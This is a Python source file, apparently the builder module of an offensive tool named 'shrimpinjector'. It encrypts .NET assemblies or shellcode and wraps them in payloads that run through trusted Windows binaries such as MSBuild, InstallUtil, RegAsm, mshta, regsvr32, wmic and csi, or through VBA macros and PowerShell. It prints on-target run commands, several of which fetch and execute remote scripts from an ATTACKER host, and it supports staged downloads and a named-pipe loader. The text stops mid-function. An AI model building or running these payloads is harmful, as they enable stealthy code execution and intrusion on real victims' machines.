import base64
import os
import shutil
import sys

from shrimpinjector.crypto import (
    aes_encrypt,
    derive_key,
    generate_iv,
    generate_key,
    parse_keying,
    xor_encrypt,
)
from shrimpinjector.engine import (
    build_vba_chunks,
    enforce_ascii,
    get_template_path,
    inject_placeholders,
    load_template,
    patch_csharp_for_xor,
    patch_powershell_for_xor,
    patch_shellcode_for_xor,
    patch_vbs_for_xor,
    remove_block,
    remove_wait_block,
    uncomment_csharp_block,
)

OUTPUT_DIR = "output"


def _ensure_output_dir(path):
    os.makedirs(os.path.dirname(path) if os.path.dirname(path) else ".", exist_ok=True)


def _read_input(path, label="Input"):
    if not os.path.exists(path):
        print(f"[-] {label} not found: {path}", file=sys.stderr)
        sys.exit(1)
    with open(path, "rb") as f:
        data = f.read()
    print(f"[*] {label}: {path} ({len(data)} bytes)", file=sys.stderr)
    return data


def _encrypt(data, args):
    if args.encryption == "xor":
        key = generate_key("xor", args.key)
        print(f"[*] Mode: XOR", file=sys.stderr)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)
        encrypted = xor_encrypt(data, key)
        return encrypted, key, None, None, None

    if getattr(args, "keying", None):
        keying = parse_keying(args.keying)
        salt = os.urandom(16)
        key = derive_key(salt, keying)
        iv = generate_iv(getattr(args, "iv", None))
        keying_names = ",".join(sorted(keying.keys()))
        print(f"[*] Mode: AES-256-CBC + environmental keying", file=sys.stderr)
        print(f"[*] Keying: {keying_names}", file=sys.stderr)
        for name in sorted(keying.keys()):
            print(f"[*]   {name} = {keying[name]}", file=sys.stderr)
        print(f"[*] Salt:    {salt.hex()}", file=sys.stderr)
        print(f"[*] Derived: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)
        encrypted = aes_encrypt(data, key, iv)
        return encrypted, key, iv, salt, keying_names

    key = generate_key("aes", args.key)
    iv = generate_iv(getattr(args, "iv", None))
    print(f"[*] Mode: AES-256-CBC", file=sys.stderr)
    print(f"[*] AES key: {key.hex()}", file=sys.stderr)
    print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)
    encrypted = aes_encrypt(data, key, iv)
    return encrypted, key, iv, None, None


def _b64(data):
    return base64.b64encode(data).decode("ascii")


def _validate_keying(args):
    if hasattr(args, "keying") and args.keying:
        if args.encryption == "xor":
            print("[-] --keying requires AES encryption (cannot use with -e xor).", file=sys.stderr)
            sys.exit(1)
        if args.key:
            print("[-] --keying and --key are mutually exclusive.", file=sys.stderr)
            sys.exit(1)


def _validate_type_method(args):
    if hasattr(args, "type") and hasattr(args, "method"):
        if (args.type is None) != (args.method is None):
            print("[-] --type and --method must be specified together.", file=sys.stderr)
            sys.exit(1)


def _csharp_args(assembly_args, indent=8):
    if not assembly_args:
        return None
    lines = []
    sp = " " * indent
    for arg in assembly_args:
        escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
        lines.append(f'{sp}"{escaped}",')
    return "\n".join(lines)


def _vbs_args(assembly_args):
    if not assembly_args:
        return None
    return ", ".join(f'"{a}"' for a in assembly_args)


def _ps_args(assembly_args):
    if not assembly_args:
        return None
    return ",".join(f'"{a}"' for a in assembly_args)


# --- C# LOLBin builder (shared by 6 payload types) ---

def _build_csharp(args, assembly_args, template_file, output_file,
                  indent=8, is_msbuild=False, ascii_enforce=False):
    _validate_keying(args)
    _validate_type_method(args)

    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_path = get_template_path(template_file, args.template)
    template = load_template(template_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    encrypted_b64 = _b64(encrypted)
    key_b64 = _b64(key)
    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    if args.encryption == "xor":
        template = patch_csharp_for_xor(template, indent=indent, is_msbuild=is_msbuild)
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{key_b64}"',
        })
        if is_msbuild:
            template = inject_placeholders(template, {'"YOURSTAGEDURL"': '""'})
    elif keying_names:
        iv_b64 = _b64(iv)
        salt_b64 = _b64(salt)
        replacements = {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': '""',
            '"YOURIVHERE"': f'"{iv_b64}"',
            '"YOURKEYINGHERE"': f'"{keying_names}"',
            '"YOURSALTHERE"': f'"{salt_b64}"',
        }
        if is_msbuild:
            replacements['"YOURSTAGEDURL"'] = '""'
        template = inject_placeholders(template, replacements)
    else:
        iv_b64 = _b64(iv)
        replacements = {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{key_b64}"',
            '"YOURIVHERE"': f'"{iv_b64}"',
            '"YOURKEYINGHERE"': '""',
            '"YOURSALTHERE"': '""',
        }
        if is_msbuild:
            replacements['"YOURSTAGEDURL"'] = '""'
        template = inject_placeholders(template, replacements)

    if hasattr(args, "type") and args.type and args.method:
        template = inject_placeholders(template, {
            '"YOURTYPEHERE"': f'"{args.type}"',
            '"YOURMETHODHERE"': f'"{args.method}"',
        })
        print(f"[*] Target: {args.type}.{args.method}()", file=sys.stderr)
    elif hasattr(args, "type"):
        template = inject_placeholders(template, {
            '"YOURTYPEHERE"': '""',
            '"YOURMETHODHERE"': '""',
        })
        print(f"[*] Target: EntryPoint (auto)", file=sys.stderr)

    args_str = _csharp_args(assembly_args, indent=indent)
    if args_str:
        sp = " " * indent
        template = template.replace(f"{sp}// YOURARGS", args_str)

    if ascii_enforce:
        template = enforce_ascii(template)

    output_path = args.output or os.path.join(OUTPUT_DIR, output_file)
    _ensure_output_dir(output_path)
    with open(output_path, "w", encoding="ascii" if ascii_enforce else "utf-8") as f:
        f.write(template)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
    return output_path


# --- Individual payload builders ---

def build_msbuild(args, assembly_args):
    if args.listener:
        return _build_msbuild_listener(args)

    if args.staged:
        if args.encryption == "xor":
            print("[-] --staged requires AES encryption (cannot use with -e xor).", file=sys.stderr)
            sys.exit(1)
        return _build_msbuild_staged(args, assembly_args)

    output_path = _build_csharp(
        args, assembly_args,
        template_file="msbuild_payload.csproj",
        output_file="msbuild_ready.csproj",
        indent=4, is_msbuild=True, ascii_enforce=True,
    )
    print(f"[*] On target:", file=sys.stderr)
    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
          f" {os.path.basename(output_path)}", file=sys.stderr)


def _build_msbuild_staged(args, assembly_args):
    _validate_keying(args)
    _validate_type_method(args)

    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_path = get_template_path("msbuild_payload.csproj", args.template)
    template = load_template(template_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    encrypted_b64 = _b64(encrypted)

    output_path = args.output or os.path.join(OUTPUT_DIR, "msbuild_ready.csproj")
    _ensure_output_dir(output_path)

    payload_path = os.path.splitext(output_path)[0] + ".bin"
    with open(payload_path, "wb") as f:
        f.write(encrypted)
    print(f"[*] Staged: payload written to {payload_path}", file=sys.stderr)
    print(f"[*] Host at: {args.staged}", file=sys.stderr)

    replacements = {
        '"YOURPAYLOADHERE"': '""',
        '"YOURSTAGEDURL"': f'"{args.staged}"',
    }

    if keying_names:
        iv_b64 = _b64(iv)
        salt_b64 = _b64(salt)
        replacements.update({
            '"YOURKEYHERE"': '""',
            '"YOURIVHERE"': f'"{iv_b64}"',
            '"YOURKEYINGHERE"': f'"{keying_names}"',
            '"YOURSALTHERE"': f'"{salt_b64}"',
        })
    else:
        key_b64 = _b64(key)
        iv_b64 = _b64(iv)
        replacements.update({
            '"YOURKEYHERE"': f'"{key_b64}"',
            '"YOURIVHERE"': f'"{iv_b64}"',
            '"YOURKEYINGHERE"': '""',
            '"YOURSALTHERE"': '""',
        })

    template = inject_placeholders(template, replacements)

    if hasattr(args, "type") and args.type and args.method:
        template = inject_placeholders(template, {
            '"YOURTYPEHERE"': f'"{args.type}"',
            '"YOURMETHODHERE"': f'"{args.method}"',
        })
    else:
        template = inject_placeholders(template, {
            '"YOURTYPEHERE"': '""',
            '"YOURMETHODHERE"': '""',
        })

    args_str = _csharp_args(assembly_args, indent=4)
    if args_str:
        template = template.replace("        // YOURARGS", args_str)

    template = enforce_ascii(template)
    with open(output_path, "w", encoding="ascii") as f:
        f.write(template)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Dropper: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
          f" {os.path.basename(output_path)}", file=sys.stderr)


def _build_msbuild_listener(args):
    spec = args.listener
    if spec.startswith("pipe="):
        pipe_name = spec[5:]
    elif spec == "pipe":
        pipe_name = "shrimploader"
    else:
        print(f"[-] Invalid listener spec: {spec}", file=sys.stderr)
        print("    Use: --listener pipe=<name>", file=sys.stderr)
        sys.exit(1)

    template_path = get_template_path("msbuild_listener.csproj", args.template)
    template = load_template(template_path)

    if args.key:
        key = bytes.fromhex(args.key)
        if len(key) != 32:
            print(f"[-] AES-256 key must be 32 bytes, got {len(key)}", file=sys.stderr)
            sys.exit(1)
    else:
        key = os.urandom(32)

    if args.iv:
        iv = bytes.fromhex(args.iv)
        if len(iv) != 16:
            print(f"[-] AES IV must be 16 bytes, got {len(iv)}", file=sys.stderr)
            sys.exit(1)
    else:
        iv = os.urandom(16)

    print(f"[*] Mode: Named pipe listener", file=sys.stderr)
    print(f"[*] Pipe name: {pipe_name}", file=sys.stderr)
    print(f"[*] AES key: {key.hex()}", file=sys.stderr)
    print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

    key_b64 = _b64(key)
    iv_b64 = _b64(iv)

    template = inject_placeholders(template, {
        '"YOURPIPENAMEHERE"': f'"{pipe_name}"',
        '"YOURKEYHERE"': f'"{key_b64}"',
        '"YOURIVHERE"': f'"{iv_b64}"',
    })

    template = enforce_ascii(template)
    output_path = args.output or os.path.join(OUTPUT_DIR, "msbuild_ready.csproj")
    _ensure_output_dir(output_path)
    with open(output_path, "w", encoding="ascii") as f:
        f.write(template)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Listener: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
          f" {os.path.basename(output_path)}", file=sys.stderr)
    print(f"[*] Send assemblies with:", file=sys.stderr)
    print(f"    python pipe_client.py {pipe_name} Seatbelt.exe"
          f" --key {key.hex()} --iv {iv.hex()} -- -group=all", file=sys.stderr)


def build_installutil(args, assembly_args):
    output_path = _build_csharp(
        args, assembly_args,
        template_file="installutil_payload.cs",
        output_file="payload_ready.cs",
        indent=8,
    )
    if args.compile:
        _compile_cs(output_path, target="library", refs=["-r:System.Configuration.Install"])
    else:
        print(f"[*] On target:", file=sys.stderr)
        print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U"
              f" {os.path.basename(output_path).replace('.cs', '.dll')}", file=sys.stderr)


def build_workflow(args, assembly_args):
    _validate_keying(args)
    _validate_type_method(args)

    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_cs_path = get_template_path("workflow_payload.cs", args.template)
    template = load_template(template_cs_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    encrypted_b64 = _b64(encrypted)
    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    if args.encryption == "xor":
        template = patch_csharp_for_xor(template, indent=4, is_msbuild=False)
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{_b64(key)}"',
        })
    elif keying_names:
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': '""',
            '"YOURIVHERE"': f'"{_b64(iv)}"',
            '"YOURKEYINGHERE"': f'"{keying_names}"',
            '"YOURSALTHERE"': f'"{_b64(salt)}"',
        })
    else:
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{_b64(key)}"',
            '"YOURIVHERE"': f'"{_b64(iv)}"',
            '"YOURKEYINGHERE"': '""',
            '"YOURSALTHERE"': '""',
        })

    if hasattr(args, "type") and args.type and args.method:
        template = inject_placeholders(template, {
            '"YOURTYPEHERE"': f'"{args.type}"',
            '"YOURMETHODHERE"': f'"{args.method}"',
        })
    else:
        template = inject_placeholders(template, {
            '"YOURTYPEHERE"': '""',
            '"YOURMETHODHERE"': '""',
        })

    args_str = _csharp_args(assembly_args, indent=8)
    if args_str:
        template = template.replace("        // YOURARGS", args_str)

    output_dir = args.output or OUTPUT_DIR
    os.makedirs(output_dir, exist_ok=True)

    output_cs = os.path.join(output_dir, "workflow_ready.cs")
    output_xoml = os.path.join(output_dir, "workflow_ready.xoml")
    output_xml = os.path.join(output_dir, "workflow_input_ready.xml")
    output_config = os.path.join(output_dir, "Microsoft.Workflow.Compiler.exe.config")

    with open(output_cs, "w") as f:
        f.write(template)
    print(f"[+] Written: {output_cs}", file=sys.stderr)

    xoml_path = get_template_path("workflow_payload.xoml")
    with open(xoml_path, "r") as f:
        xoml = f.read()
    with open(output_xoml, "w") as f:
        f.write(xoml)
    print(f"[+] Written: {output_xoml}", file=sys.stderr)

    xml_path = get_template_path("workflow_input.xml")
    with open(xml_path, "r") as f:
        input_xml = f.read()
    input_xml = input_xml.replace("YOURXOMLHERE", os.path.basename(output_xoml))
    input_xml = input_xml.replace("YOURCSHERE", os.path.basename(output_cs))
    with open(output_xml, "w") as f:
        f.write(input_xml)
    print(f"[+] Written: {output_xml}", file=sys.stderr)

    config_src = get_template_path("workflow_compiler.exe.config")
    if os.path.exists(config_src):
        shutil.copy2(config_src, output_config)
        print(f"[+] Written: {output_config}", file=sys.stderr)

    print(f"[*] On target:", file=sys.stderr)
    print(f"    1. Copy compiler to working dir:", file=sys.stderr)
    print(f"       copy C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\"
          f"Microsoft.Workflow.Compiler.exe .", file=sys.stderr)
    print(f"    2. Run:", file=sys.stderr)
    print(f"       .\\Microsoft.Workflow.Compiler.exe {os.path.basename(output_xml)} out.log",
          file=sys.stderr)


def build_regasm(args, assembly_args):
    output_path = _build_csharp(
        args, assembly_args,
        template_file="regasm_payload.cs",
        output_file="payload_ready.cs",
        indent=8,
    )
    if args.compile:
        _compile_cs(output_path, target="library")
    else:
        print(f"[*] On target:", file=sys.stderr)
        print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe /U"
              f" {os.path.basename(output_path).replace('.cs', '.dll')}", file=sys.stderr)


def build_regsvcs(args, assembly_args):
    output_path = _build_csharp(
        args, assembly_args,
        template_file="regsvcs_payload.cs",
        output_file="payload_ready.cs",
        indent=8,
    )
    if args.compile:
        _compile_cs_strong(output_path, args)
    else:
        print(f"[*] On target:", file=sys.stderr)
        print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe"
              f" {os.path.basename(output_path).replace('.cs', '.dll')}", file=sys.stderr)


def build_csc(args, assembly_args):
    output_path = _build_csharp(
        args, assembly_args,
        template_file="csc_payload.cs",
        output_file="payload_ready.cs",
        indent=8,
    )
    if args.compile:
        _compile_cs(output_path, target="exe")
    else:
        print(f"[*] On target:", file=sys.stderr)
        print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:payload.exe"
              f" {os.path.basename(output_path)}", file=sys.stderr)


def _build_ps_family(args, assembly_args, output_file):
    _validate_keying(args)

    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_path = get_template_path("powershell_cradle.ps1", args.template)
    template = load_template(template_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    encrypted_b64 = _b64(encrypted)
    key_b64 = _b64(key)
    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    if args.encryption == "xor":
        template = remove_block(template, "# KEYING_START", "# KEYING_END")
        template = patch_powershell_for_xor(template)
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{key_b64}"',
        })
    elif keying_names:
        template = remove_block(template, "# STATICKEY_START", "# STATICKEY_END")
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURSALTHERE"': f'"{_b64(salt)}"',
            '"YOURKEYINGHERE"': f'"{keying_names}"',
            '"YOURIVHERE"': f'"{_b64(iv)}"',
        })
    else:
        template = remove_block(template, "# KEYING_START", "# KEYING_END")
        iv_b64 = _b64(iv)
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{key_b64}"',
            '"YOURIVHERE"': f'"{iv_b64}"',
        })

    if assembly_args:
        args_str = _ps_args(assembly_args)
        template = template.replace("YOURARGS", args_str)
    else:
        template = template.replace("YOURARGS", "")

    output_path = args.output or os.path.join(OUTPUT_DIR, output_file)
    _ensure_output_dir(output_path)
    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    return output_path


def build_powershell(args, assembly_args):
    output_path = _build_ps_family(args, assembly_args, "payload_ready.ps1")
    print(f"[*] On target:", file=sys.stderr)
    print(f"    powershell -ep bypass -f {os.path.basename(output_path)}", file=sys.stderr)


def build_syncappvpub(args, assembly_args):
    output_path = _build_ps_family(args, assembly_args, "payload_ready.ps1")
    basename = os.path.basename(output_path)
    print(f"[*] On target (file — dot-source the .ps1):", file=sys.stderr)
    print(f'    SyncAppvPublishingServer.exe "n; . .\\{basename}"', file=sys.stderr)
    print(f"[*] On target (remote — host the .ps1 on your server):", file=sys.stderr)
    print(f"    SyncAppvPublishingServer.exe \"n; IEX(New-Object Net.WebClient)"
          f".DownloadString('http://ATTACKER/{basename}')\"", file=sys.stderr)


def _build_vbs_family(args, assembly_args, template_file, output_file):
    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_path = get_template_path(template_file, args.template)
    template = load_template(template_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    encrypted_b64 = _b64(encrypted)
    key_b64 = _b64(key)
    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    if args.encryption == "xor":
        template = patch_vbs_for_xor(template)
        template = inject_placeholders(template, {'"YOURKEYHERE"': f'"{key_b64}"'})
    else:
        template = remove_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")
        iv_b64 = _b64(iv)
        template = inject_placeholders(template, {
            '"YOURKEYHERE"': f'"{key_b64}"',
            '"YOURIVHERE"': f'"{iv_b64}"',
        })

    template = inject_placeholders(template, {'"YOURPAYLOADHERE"': f'"{encrypted_b64}"'})

    if assembly_args:
        args_str = _vbs_args(assembly_args)
        template = template.replace("YOURARGS", args_str)
    else:
        template = template.replace("Array(YOURARGS)", "Array()")

    output_path = args.output or os.path.join(OUTPUT_DIR, output_file)
    _ensure_output_dir(output_path)
    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    return output_path


def _build_vbs_staged(args, assembly_args, output_file):
    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_path = get_template_path("vbscript_staged.vbs", args.template)
    template = load_template(template_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    key_b64 = _b64(key)

    output_path = args.output or os.path.join(OUTPUT_DIR, output_file)
    _ensure_output_dir(output_path)

    payload_path = os.path.splitext(output_path)[0] + ".bin"
    with open(payload_path, "wb") as f:
        f.write(encrypted)
    print(f"[*] Staged: payload written to {payload_path}", file=sys.stderr)
    print(f"[*] Host at: {args.staged}", file=sys.stderr)

    if args.encryption == "xor":
        template = patch_vbs_for_xor(template)
        template = inject_placeholders(template, {'"YOURKEYHERE"': f'"{key_b64}"'})
    else:
        template = remove_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")
        iv_b64 = _b64(iv)
        template = inject_placeholders(template, {
            '"YOURKEYHERE"': f'"{key_b64}"',
            '"YOURIVHERE"': f'"{iv_b64}"',
        })

    template = inject_placeholders(template, {'"YOURSTAGEDURL"': f'"{args.staged}"'})

    if assembly_args:
        args_str = _vbs_args(assembly_args)
        template = template.replace("YOURARGS", args_str)
    else:
        template = template.replace("Array(YOURARGS)", "Array()")

    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    return output_path


def build_vbscript(args, assembly_args):
    if getattr(args, "staged", None):
        output_path = _build_vbs_staged(args, assembly_args, "payload_staged.vbs")
        print(f"[*] On target:", file=sys.stderr)
        print(f"    cscript {os.path.basename(output_path)}", file=sys.stderr)
        return
    output_path = _build_vbs_family(
        args, assembly_args,
        template_file="vbscript_payload.vbs",
        output_file="payload_ready.vbs",
    )
    print(f"[*] On target:", file=sys.stderr)
    print(f"    cscript {os.path.basename(output_path)}", file=sys.stderr)


def build_hta(args, assembly_args):
    if getattr(args, "staged", None):
        output_path = _build_vbs_staged(args, assembly_args, "payload_staged.hta")
        print(f"[*] On target:", file=sys.stderr)
        print(f"    mshta {os.path.basename(output_path)}", file=sys.stderr)
        return
    output_path = _build_vbs_family(
        args, assembly_args,
        template_file="hta_payload.hta",
        output_file="payload_ready.hta",
    )
    print(f"[*] On target:", file=sys.stderr)
    print(f"    mshta {os.path.basename(output_path)}", file=sys.stderr)


def build_vba(args, assembly_args):
    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_path = get_template_path("vba_payload.bas", args.template)
    template = load_template(template_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    encrypted_b64 = _b64(encrypted)
    key_b64 = _b64(key)
    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64"
          f" ({len(encrypted_b64) // 800 + 1} VBA chunks)", file=sys.stderr)

    if args.encryption == "xor":
        template = patch_vbs_for_xor(template)
        template = inject_placeholders(template, {'"YOURKEYHERE"': f'"{key_b64}"'})
    else:
        template = remove_block(template, "' DECRYPT_XOR_START", "' DECRYPT_XOR_END")
        iv_b64 = _b64(iv)
        template = inject_placeholders(template, {
            '"YOURKEYHERE"': f'"{key_b64}"',
            '"YOURIVHERE"': f'"{iv_b64}"',
        })

    payload_lines = build_vba_chunks(encrypted_b64)
    template = template.replace("    ' PAYLOADCHUNKS", payload_lines)

    if assembly_args:
        args_str = _vbs_args(assembly_args)
        template = template.replace("YOURARGS", args_str)
    else:
        template = template.replace("Array(YOURARGS)", "Array()")

    output_path = args.output or os.path.join(OUTPUT_DIR, "payload_ready.bas")
    _ensure_output_dir(output_path)
    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    1. Open Excel or Word", file=sys.stderr)
    print(f"    2. Alt+F11 to open VBA editor", file=sys.stderr)
    print(f"    3. File > Import File > {os.path.basename(output_path)}", file=sys.stderr)
    print(f"    4. F5 to run the 'Run' macro", file=sys.stderr)


def build_shellcode(args, _assembly_args=None):
    template_path = get_template_path("vba_shellcode.bas", args.template)
    template = load_template(template_path)

    sc_bytes = _read_input(args.shellcode, "Shellcode")

    if args.xor:
        if args.xor_key:
            key = bytes.fromhex(args.xor_key)
        else:
            key = os.urandom(16)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)
        sc_bytes = xor_encrypt(sc_bytes, key)
        key_b64 = _b64(key)
        template = patch_shellcode_for_xor(template, key_b64)

    if args.no_wait:
        template = remove_wait_block(template)

    sc_b64 = _b64(sc_bytes)
    print(f"[*] Base64 payload: {len(sc_b64)} chars "
          f"({len(sc_b64) // 800 + 1} VBA chunks)", file=sys.stderr)

    payload_lines = build_vba_chunks(sc_b64)
    template = template.replace("    ' PAYLOADCHUNKS", payload_lines)

    output_path = args.output or os.path.join(OUTPUT_DIR, "payload_ready.bas")
    _ensure_output_dir(output_path)
    with open(output_path, "w") as f:
        f.write(template)

    print(f"[+] Written: {output_path}", file=sys.stderr)
    print(f"[*] On target:", file=sys.stderr)
    print(f"    1. Open Excel or Word", file=sys.stderr)
    print(f"    2. Alt+F11 to open VBA editor", file=sys.stderr)
    print(f"    3. File > Import File > {os.path.basename(output_path)}", file=sys.stderr)
    print(f"    4. F5 to run Auto_Open", file=sys.stderr)


# --- Compilation helpers ---

def _compile_cs(output_path, target="library", refs=None):
    mcs = shutil.which("mcs")
    if not mcs:
        print("[-] mcs not found. Install Mono: brew install mono", file=sys.stderr)
        sys.exit(1)

    dll_path = os.path.splitext(output_path)[0] + (".dll" if target == "library" else ".exe")
    cmd = [mcs, f"-target:{target}"]
    for ref in (refs or []):
        cmd.append(ref)
    cmd.append(output_path)

    print(f"[*] Compiling: {' '.join(cmd)}", file=sys.stderr)
    ret = os.system(" ".join(cmd))
    if ret == 0:
        print(f"[+] Compiled: {dll_path}", file=sys.stderr)
    else:
        print(f"[-] Compilation failed (exit code {ret})", file=sys.stderr)
        sys.exit(1)


def _compile_cs_strong(output_path, args):
    mcs = shutil.which("mcs")
    sn = shutil.which("sn")
    if not mcs:
        print("[-] mcs not found. Install Mono: brew install mono", file=sys.stderr)
        sys.exit(1)

    snk_path = getattr(args, "keyfile", None) or os.path.join(
        os.path.dirname(output_path), "payload.snk"
    )

    if not getattr(args, "keyfile", None):
        if not sn:
            print("[-] sn not found. Install Mono: brew install mono", file=sys.stderr)
            print("    Or provide --keyfile with an existing .snk", file=sys.stderr)
            sys.exit(1)
        if not os.path.exists(snk_path):
            print(f"[*] Generating keypair: {snk_path}", file=sys.stderr)
            ret = os.system(f"sn -k {snk_path}")
            if ret != 0:
                print("[-] sn -k failed", file=sys.stderr)
                sys.exit(1)

    dll_path = os.path.splitext(output_path)[0] + ".dll"
    cmd = f"mcs -target:library -r:System.EnterpriseServices -keyfile:{snk_path} {output_path}"
    print(f"[*] Compiling: {cmd}", file=sys.stderr)
    ret = os.system(cmd)
    if ret == 0:
        print(f"[+] Compiled: {dll_path}", file=sys.stderr)
    else:
        print(f"[-] Compilation failed (exit code {ret})", file=sys.stderr)
        sys.exit(1)


def build_csi(args, assembly_args):
    _validate_type_method(args)

    assembly_bytes = _read_input(args.assembly, "Assembly")
    template_path = get_template_path("csi_payload.csx", args.template)
    template = load_template(template_path)

    encrypted, key, iv, salt, keying_names = _encrypt(assembly_bytes, args)
    encrypted_b64 = _b64(encrypted)
    key_b64 = _b64(key)
    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    if args.encryption == "xor":
        template = remove_block(template, "// USING_CRYPTO_START", "// USING_CRYPTO_END")
        template = remove_block(template, "// DECRYPT_AES_START", "// DECRYPT_AES_END")
        template = uncomment_csharp_block(template, "// DECRYPT_XOR_START", "// DECRYPT_XOR_END")
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{key_b64}"',
        })
    else:
        template = remove_block(template, "// DECRYPT_XOR_START", "// DECRYPT_XOR_END")
        iv_b64 = _b64(iv)
        template = inject_placeholders(template, {
            '"YOURPAYLOADHERE"': f'"{encrypted_b64}"',
            '"YOURKEYHERE"': f'"{key_b64}"',
            '"YOURIVHERE"': f'"{iv_b64}"',
        })

    if hasattr(args, "type") and args.type and args.method:
        template = inject_placeholders(template, {
            '"YOURTYPEHERE"': f'"{args.type}"',
            '"YOURMETHODHERE"': f'"{args.method}"',
        })
        print(f"[*] Target: {args.type}.{args.method}()", file=sys.stderr)
    else:
        template = inject_placeholders(template, {
            '"YOURTYPEHERE"': '""',
            '"YOURMETHODHERE"': '""',
        })
        print(f"[*] Target: EntryPoint (auto)", file=sys.stderr)

    args_str = _csharp_args(assembly_args, indent=4)
    if args_str:
        template = template.replace("    // YOURARGS", args_str)

    output_path = args.output or os.path.join(OUTPUT_DIR, "payload_ready.csx")
    _ensure_output_dir(output_path)
    with open(output_path, "w") as f:
        f.write(template)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
    print(f"[*] On target (csi.exe is in VS/Build Tools Roslyn dir):", file=sys.stderr)
    print(f"    csi.exe {os.path.basename(output_path)}", file=sys.stderr)


def build_regsvr32(args, assembly_args):
    output_path = _build_vbs_family(
        args, assembly_args,
        template_file="regsvr32_payload.sct",
        output_file="payload_ready.sct",
    )
    basename = os.path.basename(output_path)
    print(f"[*] On target (local):", file=sys.stderr)
    print(f"    regsvr32 /s /n /u /i:{basename} scrobj.dll", file=sys.stderr)
    print(f"[*] On target (remote — host the .sct on your server):", file=sys.stderr)
    print(f"    regsvr32 /s /n /u /i:http://ATTACKER/{basename} scrobj.dll", file=sys.stderr)


def build_wmic(args, assembly_args):
    output_path = _build_vbs_family(
        args, assembly_args,
        template_file="wmic_payload.xsl",
        output_file="payload_ready.xsl",
    )
    basename = os.path.basename(output_path)
    print(f"[*] On target (local):", file=sys.stderr)
    print(f"    wmic os get /format:\"{basename}\"", file=sys.stderr)
    print(f"[*] On target (remote — host the .xsl on your server):", file=sys.stderr)
    print(f"    wmic os get /format:\"http://ATTACKER/{basename}\"", file=sys.stderr)


def _build_sct_inf_pair(args, assembly_args, inf_template, inf_output, execution_cmd):
    sct_path = _build_vbs_family(
        args, assembly_args,
